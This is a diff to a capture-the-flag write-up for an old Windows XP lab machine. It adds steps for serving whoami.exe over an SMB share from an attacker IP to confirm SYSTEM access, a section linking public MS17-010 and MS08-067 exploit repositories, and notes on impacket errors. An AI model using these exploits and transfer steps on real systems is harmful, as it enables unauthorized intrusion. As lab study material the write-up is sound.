@@ -57,6 +57,8 @@ type root.txt
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78dea999-1856-426b-afe3-69aad9bab9de)
 
++ Transfer **whoami.exe** from **/usr/share/windows-binaries/** using **smbserver.py** since XP doesn't have a whoami binary or command.
++ Check if get the NT AUTHORITY\SYSTEM level access.
 
 ```
 smbserver.py win /usr/share/windows-binaries/
@@ -64,7 +66,17 @@ smbserver.py win /usr/share/windows-binaries/
 \\10.10.14.24\win\whoami.exe
 ```
 
++ Get both user and root flags.
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/168b61ac-c71d-4f60-8568-a9e1223f669a)
+
+
+### Method 2: [CVE-2017-0143 (ms17-010) / Shadow Brokers](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)
++ Try [1](https://github.com/helviojunior/MS17-010) [2](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)
++ The exploit didn't work on me due to the below impacket errors:
+  + [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
+  + [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
++ Others [3](https://github.com/worawit/MS17-010)
 
 
 
@@ -79,11 +91,16 @@ smbserver.py win /usr/share/windows-binaries/
 + **CVE-2008-4250 (ms08-067) / Conficker:**
   + https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
   + https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
-+ **CVE-2017-0143 (ms17-010) / Shadow Brokers:** 
++ **CVE-2017-0143 (ms17-010) / Shadow Brokers:**
+  + https://github.com/helviojunior/MS17-010
+    + https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
+  + https://github.com/worawit/MS17-010
 
 
 ## Tools
-+ x
++ **windows-binaries:** /usr/share/windows-binaries
+  + https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami
++ **smbserver.py:** https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami
 
 
 ## Technical Knowledge
@@ -91,7 +108,8 @@ smbserver.py win /usr/share/windows-binaries/
 
 
 ## Problems Solution
-+ x
++ [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
++ [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
 
 
 ## For More
